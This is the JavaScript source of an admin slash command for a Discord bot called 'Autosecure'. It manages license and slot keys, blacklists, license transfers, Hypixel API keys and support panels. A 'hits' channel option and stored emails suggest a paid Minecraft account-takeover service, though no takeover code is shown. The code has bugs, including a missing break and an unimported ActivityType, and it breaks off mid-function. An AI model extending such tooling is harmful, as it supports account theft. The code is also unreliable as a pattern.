const { owners, notifierWebhook, footer1 } = require("../../../config.json");
const config = require("../../../config.json");
const { queryParams } = require("../../../db/database");
const hasAccess = require("../../../db/access");
const deleteuser = require("../../../db/deleteuser");
const { tablesforuser, tablesfortransfer } = require("../../../db/gettablesarray");
const destroybots = require("../../../db/destroybots");
const {
  ApplicationCommandOptionType,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  AttachmentBuilder
} = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const generate = require("../../utils/generate");
const { createhelppanel } = require("../../utils/guidepanel");

const { autosecurelogs } = require("../../../autosecure/utils/embeds/autosecurelogs");
const quicksetupmsg = require("../../../autosecure/utils/embeds/quicksetupmsg");
const { transferLicense } = require("../../../autosecure/utils/bot/transferlicense");
const { saveFullConfig, sendFullConfigToUser } = require("../../../autosecure/utils/bot/configutils");
const { startBot } = require("../../../autosecure");

const { autosecureMap } = require('../../handlers/botHandler');
const { getnewkey } = require("../../../autosecure/utils/hypixelapi/getnewkey");
const checkroles = require("../../utils/checkroles");
const featurepanel = require("../../utils/featurepanel");
const purchasepanel = require("../../utils/purchasepanel");
const { getMessageId, generateLeaderboardEmbeds, updatemessageid } = require("../../utils/leaderboardupdater");

const isOwner = async (userId) => {
  return owners.includes(userId);
};

module.exports = {
  name: "admin",
  description: "Admin commands",
  type: 1, 
  options: [
    {
      name: "access",
      description: "Manage autosecure access [OWNER]",
      type: 1, 
      options: [
        {
          name: "options",
          description: "Choose any of these options",
          type: 3, 
          required: true,
          autocomplete: true
        },
        {
          name: "amount",
          description: "Amount of keys to generate (for create_key)",
          type: 4, 
          required: false
        },
        {
          name: "duration",
          description: "Duration in days (for create_key and extend_all_keys)",
          type: 3, 
          required: false
        },
        {
          name: "user_id",
          description: "User ID (optional: createkey / createslot)",
          type: 3, 
          required: false
        },
        {
          name: "key",
          description: "License key (for delete_key & checkredeemed)",
          type: 3,
          required: false
        },
        {
          name: "reason",
          description: "Reason (for blacklist_user and extend_all_licenses)",
          type: 3, 
          required: false
        },
        {
          name: "targetuser",
          description: "Transfer to",
          type: 3, 
          required: false
        }
      ]
    },
    {
      name: "config",
      description: "Change autosecure config [OWNER]",
      type: 1, 
      options: [
        {
          name: "options",
          description: "Choose any of these options",
          type: 3, 
          required: true,
          autocomplete: true
        },
        {
          name: "embed",
          description: "Choose a section to configure",
          type: 3, 
          required: false,
          choices: [
            { name: "features", value: "features" },
            { name: "guide", value: "guide" },
            { name: "update", value: "update" },
            { name: "ticket", value: "ticket" },
            { name: "purchase", value: "purchase" },
            { name: "leaderboard", value: "leaderboard" },
          ]
        }
      ]
    }
  ],

  async autocomplete(client, interaction) {

    const focusedOption = interaction.options.getFocused(true);
    const subcommand = interaction.options.getSubcommand();
    const isUserOwner = await isOwner(interaction.user.id);

    if (subcommand === 'access') {
      if (!isUserOwner) {
        return interaction.respond([{
          name: "You cannot manage access! Use /redeem to claim your license!",
          value: "license"
        }]);
      }

      const choices = [
        { name: "---Manage Keys---", value: "placeholder"},
        { name: "Create Autosecure Key", value: "create_key" },
        { name: "Create Slot Key", value: "create_slotkey" },
        { name: "Extend All Keys", value: "extend_all_keys" },
        { name: "Transfer License", value: "transfer" },
        { name: "---Remove Keys---", value: "placeholder"},
        { name: "Delete Autosecure Key", value: "delete_key" },
        { name: "Delete All Keys", value: "delete_all" },
        { name: "Remove Access", value: "remove_user" },
        { name: "Remove User Slot", value: "remove_slot" },
        { name: "Blacklist User", value: "blacklist_user" },
        { name: "Unblacklist User", value: "unblacklist_user" },
        { name: "---View Lists---", value: "placeholder"},
        { name: "View Blacklist", value: "view_blacklist" },
        { name: "View All Keys", value: "view_keys" },
        { name: "View All Users", value: "view_users" },
        { name: "View if key redeemed", value: "key_redeemed"}
      ];

      return interaction.respond(choices);
    } else if (subcommand === 'config') {
      if (!isUserOwner) {
        return interaction.respond([{
          name: "You cannot manage Autosecure.",
          value: "license"
        }]);
      }

      const choices = [
        { name: "Assign buyer role to buyers", value: "fixupdate" },
        { name: "Reset tickets count", value: "resetcount"},
        { name: "Send embed", value: "sendembed" },
        { name: "Show API-Key", value: "showapi" },
        { name: "Refresh API-Key", value: "refreshapi" },
        { name: "Enter Lifetime API-Key", value: "enterapi" },
        { name: "Remove Lifetime API-Key", value: "removeapi" },
        { name: "Refresh the Database", value: "refreshdb" },
        { name: "Restart Bot", value: "restartbot" },
        { name: "Bot Activity", value: "activity" },
        { name: "Bot Status", value: "status" },
        { name: "Set Admin", value: "proxy" },
        { name: "Show Admin", value: "showproxy" },
        { name: "Delete all tickets", value: "deletetickets" },
        { name: "Set All Hits Channel", value: "allhits" }
      ];

      return interaction.respond(choices);
    }
  },

  async execute(client, interaction) {
    const subcommand = interaction.options.getSubcommand();
    const isUserOwner = await isOwner(interaction.user.id);

    if (!isUserOwner) {
      return interaction.reply({
        content: `You don't have permission to use this command.`,
        ephemeral: true
      });
    }

    if (subcommand === "access") {
      const option = interaction.options.getString('options');
      
      try {
        const commands = await client.application.commands.fetch();
        const botCommand = commands.find(cmd => cmd.name === 'bot');

        if (option === 'create_key') {
        } else if (option === 'delete_key' && !interaction.options.getString('key')) {
          return await interaction.reply({
            content: 'You must specify a key to delete.',
            ephemeral: true
          });
        } else if (option === "key_redeemed" && !interaction.options.getString("key")) {
          return await interaction.reply({
          content: `You must specify a key to check`,
          ephemeral: true
          });
        } else if (option === 'extend_all_keys' && !interaction.options.getString('duration')) {
          return await interaction.reply({
            content: 'You must specify a duration in days.',
            ephemeral: true
          });
        } else if (option === 'blacklist_user' && !interaction.options.getString('user_id')) {
          return await interaction.reply({
            content: 'You must specify a user ID to blacklist.',
            ephemeral: true
          });
        } else if ((option === 'remove_user' || option === 'remove_slot') && !interaction.options.getString('user_id')) {
          return await interaction.reply({
            content: 'You must specify a user ID to remove access/slots from.',
            ephemeral: true
          });
        } else if (option === 'unblacklist_user' && !interaction.options.getString('user_id')) {
          return await interaction.reply({
            content: 'You must specify a user ID to unblacklist.',
            ephemeral: true
          });
        } else if (option === 'transfer' && !interaction.options.getString('user_id') && !interaction.options.getString('targetuser')) {
          return await interaction.reply({
            content: 'Please enter both a user and a target to transfer to.',
            ephemeral: true
          });
        }
        
        switch (option) {
          case 'redeem':
            await handleredeem(client, interaction);
            break;
          case 'create_key':
            await handleCreateKey(client, interaction);
            break;
          case 'create_slotkey':
            await handlecreateslotkey(client, interaction);
            break;
          case 'delete_key':
            await handleDeleteKey(client, interaction);
            break;
          case 'delete_all':
            await handleDeleteAll(client, interaction);
            break;
          case 'extend_all_keys':
            await handleExtendAllKeys(client, interaction);
            break;
          case 'view_keys':
            await handleViewKeys(client, interaction);
            break;
          case 'blacklist_user':
            await handleBlacklistUser(client, interaction);
            break;
          case 'unblacklist_user':
            await handleUnblacklistUser(client, interaction);
            break;
          case 'view_blacklist':
            await handleViewBlacklist(client, interaction);
            break;
          case 'remove_user':
            await handleremoveuser(client, interaction);
            break;
          case 'view_users':
            await handleViewUsers(client, interaction);
            break;
          case 'remove_slot':
            await handleremoveslot(client, interaction);
            break;
          case 'transfer':
            await handletransfer(client, interaction)
            break; 
            case "key_redeemed":
              await handlecheckredeemed(client, interaction)
          default:
            await interaction.reply({
              content: 'Invalid option selected.',
              ephemeral: true
            });
        }
      } catch (error) {
        console.error("Error in access command:", error);
        if (!interaction.replied && !interaction.deferred) {
          await interaction.reply({
            content: 'An error occurred while processing this command.',
            ephemeral: true
          });
        } else if (interaction.deferred) {
          await interaction.editReply({
            content: 'An error occurred while processing this command.'
          });
        }
      }
    } else if (subcommand === "config") {
      const choice = interaction.options.getString("options");

      function getRelativeTimestamp(epochTime) {
        return `<t:${Math.floor(epochTime / 1000)}:R>`;
      }

      try {
        switch (choice) {

case "sendembed":
  const selected = interaction.options.getString("embed");

  if (!selected) {
    return await interaction.reply({
      content: "You must select one of the embed options :)",
      ephemeral: true
    });
  }

  await handlesendembed(client, interaction, selected);
  break;

async function handlesendembed(client, interaction, selected) {
  if (!interaction.inGuild()) {
    return interaction.reply({ 
      content: "This command can only be used in a server.", 
      ephemeral: true 
    });
  }

  try {
    switch (selected) {
      case "guide":
        const helpMsg = createhelppanel()
        await interaction.channel.send(helpMsg);
        return interaction.reply({ 
          content: `✅ Successfully sent guide panel to this channel!`, 
          ephemeral: true 
        });

      case "features":
        const featureMsg = await featurepanel()
        await interaction.channel.send(featureMsg);
        return interaction.reply({ 
          content: `✅ Successfully sent features panel to this channel!`, 
          ephemeral: true 
        });

      case "purchase":
        const purchasemsg = await purchasepanel();
        await interaction.channel.send(purchasemsg);
        return interaction.reply({ 
          content: `✅ Successfully sent purchase msg to this channel!`, 
          ephemeral: true 
        });

      case "update":
        let rId = generate(32);
        await queryParams(
          `INSERT INTO actions (id, action) VALUES (?, ?)`, 
          [rId, `sendupdate|${interaction.channel.id}`]
        );

        const modal = new ModalBuilder()
          .setCustomId(`action|${rId}`)
          .setTitle('Create update embed');

        const addedInput = new TextInputBuilder()
          .setCustomId('added')
          .setLabel("New features added")
          .setPlaceholder("Enter new features (one per line)")
          .setStyle(TextInputStyle.Paragraph)
          .setRequired(true)
          .setMaxLength(4000);

        const changedInput = new TextInputBuilder()
          .setCustomId('changed')
          .setLabel("Changes made")
          .setPlaceholder("Enter changes (one per line)")
          .setStyle(TextInputStyle.Paragraph)
          .setRequired(true)
          .setMaxLength(4000);

        const firstActionRow = new ActionRowBuilder().addComponents(addedInput);
        const secondActionRow = new ActionRowBuilder().addComponents(changedInput);

        modal.addComponents(firstActionRow, secondActionRow);

        await interaction.showModal(modal);
        return;

case "leaderboard":
  await interaction.deferReply({ ephemeral: true });

  const key = await getMessageId();
  let oldmessageid, oldchannelid;
  let deletedOld = false;

  if (key) {
    [oldmessageid, oldchannelid] = key.split("|");
    try {
      const oldChannel = await client.channels.fetch(oldchannelid);
      const oldMessage = await oldChannel.messages.fetch(oldmessageid);
      await oldMessage.delete();
      deletedOld = true;
    } catch (err) {
      console.error("Failed to delete old leaderboard message:", err);
    }
  }

  const currentChannelId = interaction.channelId;

  if (!currentChannelId) {
    return interaction.editReply({
      content: `This command should be used in a server.`,
      ephemeral: true
    });
  }

  try {
    const leaderboardEmbed = await generateLeaderboardEmbeds();
    const channel = await client.channels.fetch(currentChannelId);
    const sentMessage = await channel.send(leaderboardEmbed);
    await updatemessageid(sentMessage.id, currentChannelId);

    const msg = deletedOld
      ? "Old leaderboard message was deleted. ✅\nNew leaderboard posted successfully."
      : "No old leaderboard message found or couldn't be deleted.\nNew leaderboard posted successfully.";

    await interaction.editReply({
      content: msg,
      ephemeral: true
    });
  } catch (err) {
    console.error("Failed to send leaderboard or update DB:", err);
    await interaction.editReply({
      content: `❌ Failed to post leaderboard.`,
      ephemeral: true
    });
  }

  return;




      

      case "ticket":
        const ticketEmbed = new EmbedBuilder()
          .setTitle('Autosecure support')
          .setDescription('Select the type of support ticket you need from the menu below:')
          .setColor(0xC8A2C8);

        const ticketOptions = new StringSelectMenuBuilder()
          .setCustomId(`createticket|${interaction.user.id}`)
          .setPlaceholder('Select ticket type...')
          .addOptions([
            {
              label: 'Request purchase with different method!',
              description: 'Ex: different crypto, paypal, so on',
              value: 'purchase',
              emoji: '💸'
            },
            {
              label: 'Suggestions/Autosecure Issues',
              description: 'Report bugs or suggest improvements',
              value: 'suggestion',
              emoji: '❓'
            },
            {
              label: 'License Recovery',
              description: 'Get help with license issues',
              value: 'license',
              emoji: '🔑'
            },
            {
              label: 'Account issues',
              description: 'Request account recovery (database)',
              value: 'recoveraccount',
              emoji: '🔒'
            }
          ]);

        const row = new ActionRowBuilder().addComponents(ticketOptions);

        await interaction.channel.send({ 
          embeds: [ticketEmbed], 
          components: [row] 
        });

        return interaction.reply({ 
          content: `✅ Ticket panel created successfully!`, 
          ephemeral: true 
        });

      default:
        return interaction.reply({ 
          content: "❌ Invalid option selected.", 
          ephemeral: true 
        });
    }
  } catch (error) {
    console.error("Error in handlesendembed:", error);
    return interaction.reply({ 
      content: `❌ Failed to send panel: ${error.message}`, 
      ephemeral: true 
    });
  }
}






          case "stats":
            await interaction.reply({ content: "Change stats settings here!", ephemeral: true });
            break;

          case "fixupdate":
            let rolenumber = await checkroles(client)
            await interaction.reply({ content: `Role fixer result: ${JSON.stringify(rolenumber)}`, ephemeral: true });
            break;

case "resetcount":
  try {
    const controlbot = await queryParams(`SELECT * FROM controlbot WHERE id = ?`, [1]);

    if (controlbot.length === 0) {
      await interaction.reply({
        content: `There is no controlbot table or no row with id 1!`,
        ephemeral: true
      });
    } else {
      await queryParams(`UPDATE controlbot SET ticketcount = 0 WHERE id = ?`, [1], "run");

      await interaction.reply({
        content: `✅ Ticket count has been successfully reset to 0.`,
        ephemeral: true
      });
    }
  } catch (error) {
    console.error("Error resetting ticket count:", error);
    await interaction.reply({
      content: `❌ An error occurred while resetting the ticket count.`,
      ephemeral: true
    });
  }
  break;

          case "proxy":
            await handleProxyModal(interaction);
            break;

          case "showproxy":
            await showproxy(interaction);
            break;

          case "deletetickets":
            await deletetickets(client, interaction);
            break;

          case "allhits":
            await handleAllHits(client, interaction);
            break;

          case "delete":
            await queryParams("DELETE FROM registeredemails");
            await interaction.reply({ content: "Removed all mails!", ephemeral: true });
            break;


          case "activity":
            await activity(interaction);
            break;


              case "panel":
        const panelModal = new ModalBuilder()
          .setCustomId('send_panel_modal')
          .setTitle('Send guide panel!');

        const panelInput = new TextInputBuilder()
          .setCustomId('send_panel_input')
          .setLabel('Enter your GUILD ID')
          .setStyle(TextInputStyle.Short)
          .setRequired(true);

        const panelActionRow = new ActionRowBuilder().addComponents(panelInput);
        panelModal.addComponents(panelActionRow);

        await interaction.showModal(panelModal);

        try {
          const modalInteraction = await interaction.awaitModalSubmit({
            filter: (i) => i.customId === 'send_panel_modal',
            time: 60000,
          });
      
          const channelId = modalInteraction.fields.getTextInputValue('send_panel_input');
          const channel = client.channels.cache.get(channelId);
      
          if (!channel || !channel.isTextBased()) {
            await modalInteraction.reply({ content: "Channel not found or is not a text channel!", ephemeral: true });
            return;
          }
      
          const msg = createhelppanel();
          await channel.send(msg);
          await modalInteraction.reply({ content: "Guide panel sent successfully!", ephemeral: true });
        } catch (error) {
          if (error.code === 'INTERACTION_COLLECTOR_ERROR') {
            console.log("Modal was closed without submission.");
          } else {
            console.error("Error handling panel modal:", error);
          }
        }
        break;

      case "database":
        await interaction.reply({ content: "Configure the database here!", ephemeral: true });
        break;

      case "bot":
        await interaction.reply({ content: "Configure the controller bot here!", ephemeral: true });
        break;

      case "showapi":
        await interaction.deferReply({ ephemeral: true });
        try {
          const results = await queryParams("SELECT apikey, time FROM apikey WHERE id = ?", [1]);
          const results2 = await queryParams("SELECT apikey, time FROM apikey WHERE id = ?", [2]);
      
          let response = "";
      
          if (results2 && results2.length > 0) {
            const { apikey: key2, time: time2 } = results2[0];
            response = `Current Mode: Lifetime\nAPI-Key: \n\`\`\`${key2}\`\`\`\nExpires in ${getRelativeTimestamp(time2)}`;
          } else if (results && results.length > 0) {
            const { apikey: key, time } = results[0];
            response = `Current Mode: Temporary\nAPI-Key: \n\`\`\`${key}\`\`\`\nExpires in ${getRelativeTimestamp(time)}`;
          } else {
            response = "No API key found!";
          }
      
          await interaction.editReply({ content: response });
        } catch (error) {
          console.error("Error fetching API keys:", error);
          await interaction.editReply({ content: "An error occurred while retrieving API keys." });
        }
        break;

      case "refreshapi":
        await interaction.reply({ content: "Requesting a new Hypixel API key...", ephemeral: true });
        try {
          const result = await getnewkey(queryParams, 'lifetime');
          if (result?.apiKey) {
            const maskedKey = result.apiKey.length > 12
              ? `${result.apiKey.slice(0, 8)}...${result.apiKey.slice(-4)}`
              : result.apiKey;
            const expires = Math.floor(result.expirationTime / 1000);

            await interaction.editReply({
              content: [
                "✅ Refreshed Hypixel developer key.",
                `Key: \`\`\`${maskedKey}\`\`\``,
                `Expires: <t:${expires}:R>`
              ].join('\n')
            });
          } else {
            await interaction.editReply({
              content: "✅ Refresh request sent to the automation worker. The new key will appear once the worker finishes."
            });
          }
        } catch (error) {
          console.error("Error refreshing API key:", error);
          await interaction.editReply({ content: `❌ Failed to refresh API key: ${error.message}` });
        }
        break;

case "enterapi":
  const apiModal = new ModalBuilder()
    .setCustomId('enter_api_modal')
    .setTitle('Enter API Key');

  const apiKeyInput = new TextInputBuilder()
    .setCustomId('api_key_input')
    .setLabel('Enter your API Key:')
    .setStyle(TextInputStyle.Short)
    .setRequired(true);

  const apiActionRow = new ActionRowBuilder().addComponents(apiKeyInput);
  apiModal.addComponents(apiActionRow);

  await interaction.showModal(apiModal);

  try {
    const modalInteraction = await interaction.awaitModalSubmit({
      filter: (i) => i.customId === 'enter_api_modal',
      time: 60000,
    });

    const apiKey = modalInteraction.fields.getTextInputValue('api_key_input');
    const timestamp = Date.now();

    // Check if id=2 exists
    const existingRows = await queryParams("SELECT * FROM apikey WHERE id = ?", [2]);

    if (existingRows.length > 0) {
      // Exists, update
      await queryParams("UPDATE apikey SET apikey = ?, time = ? WHERE id = ?", [apiKey, timestamp, 2]);
    } else {
      // Doesn't exist, insert
      await queryParams("INSERT INTO apikey (id, apikey, time) VALUES (?, ?, ?)", [2, apiKey, timestamp]);
    }

    await modalInteraction.reply({ content: "API Key has been successfully entered!", ephemeral: true });
  } catch (error) {
    if (error.code === 'INTERACTION_COLLECTOR_ERROR') {
      console.log("Modal was closed without submission.");
    } else {
      console.error("Error handling API key modal:", error);
    }
  }
  break;

      case "refreshdb":
        await interaction.deferReply({ ephemeral: true });;
        await interaction.editReply({
          content: "Deprecated"
        });
        break;

      case "showdatabase":
        await interaction.deferReply({ ephemeral: true });
        try {
          const tables = await queryParams("SELECT name FROM sqlite_master WHERE type='table'", []);
          if (!tables || tables.length === 0) {
            await interaction.editReply({ content: "No tables found in the database." });
            return;
          }
        
          let response = "**📂 Database Structure:**\n";
          for (const table of tables) {
            // Use a safer approach - table names from database won't have injection vectors
            // but we still avoid SQL injection by using parameterized queries where possible
            // PRAGMA table_info doesn't support parameters, so we validate table.name first
            const tableName = String(table.name).replace(/[^a-zA-Z0-9_]/g, '');
            if (!tableName || tableName.length === 0) {
              console.warn(`Suspicious table name skipped: ${table.name}`);
              continue;
            }
            const columns = await queryParams(`PRAGMA table_info(${tableName})`, []);
            const columnDetails = columns.map(col => `  - \`${col.name}\` (${col.type})`).join("\n");
            response += `\n**🔹 ${tableName}**\n${columnDetails || "  - (No columns found)"}`;
          }
        
          if (response.length > 2000) {
            const fs = require("fs");
            const filePath = "./database_structure.txt";
            fs.writeFileSync(filePath, response, "utf8");
            await interaction.editReply({
              content: "The database structure is too large to display. Here is the file:",
              files: [filePath]
            });
          } else {
            await interaction.editReply({ content: response });
          }
        } catch (error) {
          console.error("Error fetching database structure:", error);
          await interaction.editReply({ content: "An error occurred while retrieving database structure." });
        }
        break;

      case "activity":
        const activityModal = new ModalBuilder()
          .setCustomId('enter_activity_modal')
          .setTitle('Set Bot Activity');

        const activityTypeInput = new TextInputBuilder()
          .setCustomId('activity_type_input')
          .setLabel('Playing, Listening, Watching, Streaming')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('e.g., Playing')
          .setRequired(true);

        const activityNameInput = new TextInputBuilder()
          .setCustomId('activity_name_input')
          .setLabel('Activity Content')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('e.g., Minecraft')
          .setRequired(true);

        const row1 = new ActionRowBuilder().addComponents(activityTypeInput);
        const row2 = new ActionRowBuilder().addComponents(activityNameInput);

        activityModal.addComponents(row1, row2);

        await interaction.showModal(activityModal);

        try {
          const modalInteraction = await interaction.awaitModalSubmit({
            filter: (i) => i.customId === 'enter_activity_modal',
            time: 60000,
          });

          const activityType = modalInteraction.fields.getTextInputValue('activity_type_input').toUpperCase();
          const activityName = modalInteraction.fields.getTextInputValue('activity_name_input');

          const activityTypes = {
            'PLAYING': 0,
            'LISTENING': ActivityType.Listening,
            'WATCHING': ActivityType.Watching,
            'COMPETING': ActivityType.Competing,
            'STREAMING': ActivityType.Streaming
          };
          
          const userActivityType = activityType.trim().toUpperCase();

          if (!activityTypes.hasOwnProperty(userActivityType)) {
            await modalInteraction.reply({
              content: "Invalid activity type! Please use: Playing, Listening, Watching, Competing, or Streaming",
              ephemeral: true
            });
            return;
          }

          try {
            await client.user.setActivity(activityName, { type: activityTypes[activityType] });
            
            await queryParams(
              `INSERT OR REPLACE INTO controlbot (id, activity_type, activity_name) 
               VALUES (?, ?, ?)`,
              [1, activityType, activityName]
            );
            
            await modalInteraction.reply({
              content: `Bot activity updated!\nType: ${activityType}\nContent: ${activityName}`,
              ephemeral: true
            });
          } catch (error) {
            console.error("Error updating presence:", error);
            await modalInteraction.reply({
              content: "Failed to update bot activity. Please try again.",
              ephemeral: true
            });
          }
        } catch (error) {
          if (error.code === 'INTERACTION_COLLECTOR_ERROR') {
            console.log("Modal was closed without submission.");
          } else {
            console.error("Error handling activity modal:", error);
          }
        }
        break;

      case "status":
        const statusmodal = new ModalBuilder()
          .setCustomId('enter_status_modal')
          .setTitle('Set Bot Status');
        
        const statusTypeInput = new TextInputBuilder()
          .setCustomId('status_input')
          .setLabel('Status (online, offline, dnd, invisible)')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('e.g., online')
          .setRequired(true);
        
        const row33 = new ActionRowBuilder().addComponents(statusTypeInput);
        statusmodal.addComponents(row33);
        
        await interaction.showModal(statusmodal);
        
        try {
          const modalInteraction = await interaction.awaitModalSubmit({
            filter: (i) => i.customId === 'enter_status_modal',
            time: 60000,
          });
          
          const status = modalInteraction.fields.getTextInputValue('status_input').toLowerCase();
          
          const validStatuses = ['online', 'dnd', 'invisible', 'idle'];
          if (!validStatuses.includes(status)) {
            await modalInteraction.reply({
              content: "Invalid status. Please choose from: online, dnd, invisible, idle",
              ephemeral: true
            });
            return;
          }
          
          await queryParams(
            "UPDATE controlbot SET status = ? WHERE id = 1", 
            [status]
          );
          
          client.user.setStatus(status);
          
          await modalInteraction.reply({
            content: `Bot status set to ${status}`,
            ephemeral: true
          });
        } catch (error) {
          if (error.code === 'INTERACTION_COLLECTOR_ERROR') {
            console.log("Modal was closed without submission.");
          } else {
            console.error("Error updating presence:", error);
            await interaction.followUp({
              content: "Failed to update bot status. Please try again.",
              ephemeral: true
            });
          }
        }
        break;

      case "removeapi":
        try {
          await queryParams("DELETE FROM apikey WHERE id = ?", [2]);
          await interaction.reply({ content: "Deleted Lifetime API-Key!", ephemeral: true });
        } catch (error) {
          console.error("Error deleting API key:", error);
          await interaction.reply({ content: "Failed to delete Lifetime API-Key!", ephemeral: true });
        }
        break;

      case "restartbot":
        startBot(true);
        await interaction.reply({ content: "Restarting bot!", ephemeral: true });
        break;


          default:
            await interaction.reply({
              content: 'Invalid option selected.',
              ephemeral: true
            });
        }
      } catch (error) {
        console.error("Error in manage command:", error);
        await interaction.reply({
          content: 'An error occurred while processing this command.',
          ephemeral: true
        });
      }
    }
  }
};





/// Functions

async function handleredeem(client, interaction) {
  interaction.reply({
    content: 'Use `/redeem`',
    ephemeral: true
  });
}




async function handletransfer(client, interaction) {
    let olduser = interaction.options.getString('user_id');
    let targetuser = interaction.options.getString('targetuser');


    if (!await hasAccess(olduser)) {
        return interaction.reply({ content: "That user doesn't have a license!", ephemeral: true });
    } 

    else if (await hasAccess(targetuser)) {
        return interaction.reply({ content: "The target already has a license, check your the user ID.", ephemeral: true });
    }

    let oldlicense = await queryParams("SELECT license FROM usedLicenses WHERE user_id=?", [olduser]);
    if (oldlicense.length === 0) {
        return interaction.reply({
            content: "User seems to have access, but couldn't find their license!",
            ephemeral: true
        });
    } else {
        let oldLicenseKey = oldlicense[0].license;

    const result = await destroybots(olduser);
    console.log(`${result.destroyed}/${result.total} destroyed for transfer!`);

        // Transfer the license and get the new license key
        let newLicenseKey = await transferLicense(oldLicenseKey, olduser, targetuser);
        console.log(`Transfered from ${oldLicenseKey} to ${newLicenseKey} (from ${olduser} to ${targetuser}})`)
            if (newLicenseKey){
                autosecurelogs(client, 'transfer', olduser, targetuser, oldLicenseKey, newLicenseKey)
            } else{
            autosecurelogs(client, 'transfer', olduser, targetuser, 'failed') 
            }




        interaction.reply({
            content: `Successfully transferred the license! The new license key for <@${targetuser}> is: ${newLicenseKey}`,
            ephemeral: true
        });

        client.users.fetch(targetuser)
            .then((user) => {
                user.send({
                    content: `Your license has been transfered by <@${interaction.user.id}>. Your new license key is: ${newLicenseKey} (save it)\nYou can now use your bot(s) again!`
                });
            })
            .catch((err) => {
                console.error("Could not send message to target user:", err);
            });

        client.users.fetch(olduser)
            .then((user) => {
                user.send({
                    content: `Your license has been removed as it was transferred to another user. If this was a mistake, please make a ticket`
                });
            })
            .catch((err) => {
                console.error("Could not send message to old user:", err);
            });
    }
}








async function handleremoveslot(client, interaction) {

  // Delete old bot, send cfg settings and so on!

  const userId = interaction.options.getString('user_id');
  if (!userId) {
    return interaction.reply({
      content: `Enter a user please`,
      ephemeral: true
    });
  }

  const existing = await queryParams("SELECT slots FROM slots WHERE user_id = ?", [userId]);

  if (existing.length === 0 || existing[0].slots <= 0) {
    const noSlotEmbed = new EmbedBuilder()
      .setColor('#ff4d4d')
      .setDescription("You don't have any bot slots!");
    return interaction.reply({ embeds: [noSlotEmbed], ephemeral: true });
  }

  const newSlotCount = existing[0].slots - 1;
  if (newSlotCount < 1){
    let cantembed = new EmbedBuilder()
    .setColor('#5f9ea0')
    .setDescription("User already has 1 bot")
    return interaction.reply({ embeds: [cantembed], ephemeral: true });
  }
  await queryParams("UPDATE slots SET slots = ? WHERE user_id = ?", [newSlotCount, userId]);

  const embed = new EmbedBuilder()
    .setColor('#5f9ea0')
    .setDescription("## Removed bot slot!");

  const dmembed = new EmbedBuilder()
    .setColor('#5f9ea0')
    .setDescription("A Lifetime Bot Slot was removed from your account.")
    .addFields({ name: "Updated slots", value: `\`\`\`${newSlotCount}\`\`\``, inline: false });

  try {
    await interaction.user.send({ embeds: [dmembed] });
  } catch (e) {
    console.error("Failed to DM user:", e);
    const fixembed = new EmbedBuilder()
      .setColor('#5f9ea0')
      .setDescription(`**Removed slot but couldn't dm!**`);
    return interaction.reply({ embeds: [fixembed], ephemeral: true });
  }

  await interaction.reply({ embeds: [embed], ephemeral: true });
}

// Importat fix
async function handlecheckredeemed(client, interaction) {
  const key = interaction.options.getString("key");

  const isnormallicense = await queryParams(`SELECT * FROM licenses WHERE license = ?`, [key]);
  const isunusedslotkey = await queryParams(`SELECT * FROM unusedslots WHERE unusedslots = ?`, [key]);
  const redeemedlicense = await queryParams(`SELECT * FROM usedLicenses WHERE license = ?`, [key]);

  if (redeemedlicense && redeemedlicense.length > 0) {
    const info = redeemedlicense[0];
    await interaction.reply({
      content: 
        `🔒 The license key \`${key}\` has **already been redeemed**.\n` +
        `• Redeemed by: <@${info.user_id}>\n` +
        `• Expiry: \`${info.expiry || 'Unknown'}\`\n` +
        `• Trial: \`${info.istrial === 1 ? 'Yes' : 'No'}\``,
      ephemeral: true
    });
  } else if (isnormallicense && isnormallicense.length > 0) {
    const info = isnormallicense[0];
    await interaction.reply({
      content:
        `✅ The license key \`${key}\` is a **valid license** and has **not been redeemed yet**.\n` +
        `• Duration: \`${info.duration || 'Unknown'}\``,
      ephemeral: true
    });
  } else if (isunusedslotkey && isunusedslotkey.length > 0) {
    await interaction.reply({
      content:
        `🧩 The license key \`${key}\` is a **valid unused slot key**.\n` +
        `• This can be used to activate a slot under an existing license.`,
      ephemeral: true
    });
  } else {
    await interaction.reply({
      content:
        `❌ The license key \`${key}\` is **invalid** or does **not exist** in any known license table.`,
      ephemeral: true
    });
  }
}



async function handlecreateslotkey(client, interaction) {
  const amount = interaction.options.getInteger('amount') || 1;
  const userid = interaction.options.getString('user_id') || null;
  const createdKeys = [];

  if (userid) {
    const existing = await queryParams("SELECT * FROM slots WHERE user_id = ?", [userid]);

    if (existing.length > 0) {
      await queryParams("UPDATE slots SET slots = slots + 1 WHERE user_id = ?", [userid]);
    } else {
      await queryParams("INSERT INTO slots(user_id, slots) VALUES(?, ?)", [userid, 1]);
    }

    const updated = await queryParams("SELECT slots FROM slots WHERE user_id = ?", [userid]);
    const currentSlots = updated[0]?.slots || 0;

    try {
      const userObj = await client.users.fetch(userid);
      const dmembed = new EmbedBuilder()
        .setColor('#5f9ea0')
        .setDescription(`You've been gifted an extra Lifetime Bot Slot by <@${interaction.user.id}>`)
        .addFields({ name: "Updated slots", value: `\`\`\`${currentSlots || 0}\`\`\``, inline: false })
      await userObj.send({ embeds: [dmembed] });
    } catch (e) {
      console.error("Could not send DM to user:", e);
    }

    await interaction.reply({
      content: `Redeemed 1 slot key for <@${userid}>.`,
      ephemeral: true
    });
  } else {
    for (let i = 0; i < amount; i++) {
      const slotkey = `extraslot-${generate(16)}`;
      await queryParams('INSERT INTO unusedslots(unusedslots) VALUES(?)', [slotkey]);
      createdKeys.push(slotkey);
    }

    await interaction.reply({
      content: `Created ${amount} slot key(s):\n\`\`\`\n${createdKeys.join('\n')}\n\`\`\``,
      ephemeral: true
    });
  }
}












async function handleremoveuser(client, interaction) {
  const userId = interaction.options.getString('user_id');
  const reason = interaction.options.getString('reason') || 'No reason provided';
  
  await interaction.deferReply({ ephemeral: true });

  try {
    const hadAccess = await hasAccess(userId);
    
    if (!hadAccess) {
      return await interaction.editReply({
        content: `This user doesn't have access!`,
        ephemeral: true
      });
    }
    
    // Prepare embeds

      
    const removalEmbed = new EmbedBuilder()
      .setTitle('Your access to Autosecure has been removed!')
      .setDescription(`Reason: ${reason}`)
      .setColor('#5f9ea0');
    

    
